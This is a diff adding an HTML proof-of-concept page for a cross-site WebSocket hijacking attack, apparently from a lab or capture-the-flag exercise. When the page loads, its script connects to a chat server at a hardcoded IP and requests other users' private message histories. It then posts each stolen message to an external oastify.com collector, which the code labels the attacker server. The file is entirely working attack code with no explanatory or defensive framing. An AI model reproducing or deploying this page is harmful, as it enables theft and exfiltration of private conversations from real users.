@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>WebSocket CSRF Attack</h1>
+    <div id="stolen-data"></div>
+    <div id="output"></div>
+
+    <script>
+        function log(message) {
+            const output = document.getElementById('output');
+            const timestamp = new Date().toLocaleTimeString();
+            output.innerHTML += `<div>[${timestamp}] ${message}</div>`;
+        }
+
+        function addStolenMessage(from, message) {
+            const div = document.getElementById('stolen-data');
+            const msgDiv = document.createElement('div');
+            msgDiv.innerHTML = `<strong>${from}:</strong> ${message}`;
+            div.appendChild(msgDiv);
+            
+            // Exfiltrate to attacker server
+            fetch('https://xhifcuzsfehqpj62vz9qykf0brhi59ty.oastify.com/collect', {
+                method: 'POST',
+                body: JSON.stringify({ from, message })
+            });
+        }
+
+        // Auto-execute attack when page loads
+        window.addEventListener('load', function() {
+            log('Starting attack...');
+            
+            const ws = new WebSocket('ws://3.249.178.55');
+            
+            ws.onopen = function() {
+                log('Connected! Requesting Bob-Charlie history...');
+                ws.send(JSON.stringify({ 
+                    type: 'get_history', 
+                    with_user: 'charlie' 
+                }));
+                setTimeout(() => {
+                    ws.send(JSON.stringify({ 
+                        type: 'get_history', 
+                        with_user: 'bob' 
+                    }));
+                }, 1000);
+            };
+            
+            ws.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                if (data.type === 'history') {
+                    log(`Got ${data.messages.length} messages`);
+                    data.messages.forEach(msg => {
+                        addStolenMessage(msg.from, msg.message);
+                    });
+                }
+            };
+        });
+    </script>
+</body>
+</html>
